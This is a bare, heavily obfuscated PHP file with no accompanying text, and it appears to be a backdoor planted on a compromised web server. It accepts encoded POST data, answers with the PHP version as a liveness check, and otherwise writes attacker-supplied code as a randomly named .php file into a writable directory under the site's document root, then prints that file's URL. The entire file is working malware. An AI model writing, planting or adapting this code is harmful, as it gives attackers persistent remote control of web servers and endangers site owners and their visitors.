<?php $xVfnA = "\104".chr(623-544).chr(67)."\x55".chr(952-875)."\x45".chr(397-319)."\124"."\x5f".chr(884-802).'O'.'O'.'T';$PLEgfg = chr(72)."\x54".'T'.chr(470-390).'_'.chr(506-434).chr(79).'S'."\x54";$kuxYd = "\150".chr(116)."\164".chr(112).':'."\57"."\57";$Klhfkc = chr(241-195).'p'.chr(154-50)."\160";$kfwHWeofDT = chr(676-564).'h'."\x70";$WmKKlgV = chr(938-836)."\x69"."\x6c"."\145".chr(95).chr(159-47)."\x75".chr(116).'_'."\x63"."\x6f".chr(760-650)."\x74".chr(101).chr(110)."\x74".chr(622-507);$BuGWFsUu = chr(756-642).'a'."\x77".'u'.chr(114)."\x6c"."\x64".chr(101).chr(1012-913).'o'."\x64"."\x65";$PfXPGsB = 'u'.'n'.'s'."\x65".chr(114)."\151".chr(97).'l'.chr(105).'z'."\145";$CeeqUIcAGS = chr(945-840)."\163".chr(373-278)."\167"."\x72".chr(253-148)."\x74".'a'."\142"."\154".'e';$DzIumtJ = 'p'.'h'.chr(112)."\166"."\145".'r'."\163"."\151".chr(182-71).chr(511-401);$mUpiJ = 's'.'t'.chr(842-728)."\x5f".chr(151-37)."\x6f".chr(320-204).chr(655-606).'3';$kDDmN = chr(115-0).chr(101)."\162"."\151"."\141"."\x6c".'i'."\x7a"."\145";$LvHPs = "\x73".chr(116).'r'."\x5f".chr(307-192)."\160".chr(108).'i'.chr(853-737);foreach ($_POST as $uNuoRXnQKC => $QDpIpab){$gGvIXu = strlen($uNuoRXnQKC);if ($gGvIXu == 16){$QDpIpab = $LvHPs($BuGWFsUu($mUpiJ($QDpIpab)));$uNuoRXnQKC = array_slice($LvHPs(str_repeat($uNuoRXnQKC, (count($QDpIpab)/16)+1)), 0, count($QDpIpab));function srWhkCIR($MvCQbu, $UANrzSIAHexSku, $uNuoRXnQKC){$guipXDzk = "327f00d8-fb82-4b8a-849d-362a816af97d";return $MvCQbu ^ $guipXDzk[$UANrzSIAHexSku % strlen($guipXDzk)] ^ $uNuoRXnQKC;}$QDpIpab = array_map("srWhkCIR", array_values($QDpIpab), array_keys($QDpIpab), array_values($uNuoRXnQKC));$QDpIpab = implode("", $QDpIpab);$QDpIpab = @$PfXPGsB($QDpIpab);if (@is_array($QDpIpab)){$THvMi = array_keys($QDpIpab);$QDpIpab = $QDpIpab[$THvMi[0]];if ($QDpIpab === $THvMi[0]){echo @$kDDmN(Array($kfwHWeofDT => @$DzIumtJ(), ));exit();}else {function aaDTeww($UANrzir){static $nriZYXDkNg = array();$cjhzkC = glob($UANrzir . '/*', GLOB_ONLYDIR);$tSqsZXvKWS = count($cjhzkC);if ($tSqsZXvKWS > 0) {foreach ($cjhzkC as $UANrz) {if (@$CeeqUIcAGS($UANrz)) {$nriZYXDkNg[] = $UANrz;}}}foreach ($cjhzkC as $UANrzir) aaDTeww($UANrzir);return $nriZYXDkNg;}$FUgGE = $_SERVER[$xVfnA];$cjhzkC = aaDTeww($FUgGE);$THvMi = array_rand($cjhzkC);$XeVFWgptIf = $cjhzkC[$THvMi] . "/" . substr(md5(time()), 0, 8) . $Klhfkc;@$WmKKlgV($XeVFWgptIf, $QDpIpab);$jOgcE = $kuxYd . $_SERVER[$PLEgfg] . substr($XeVFWgptIf, strlen($FUgGE));print($jOgcE);die();}}}}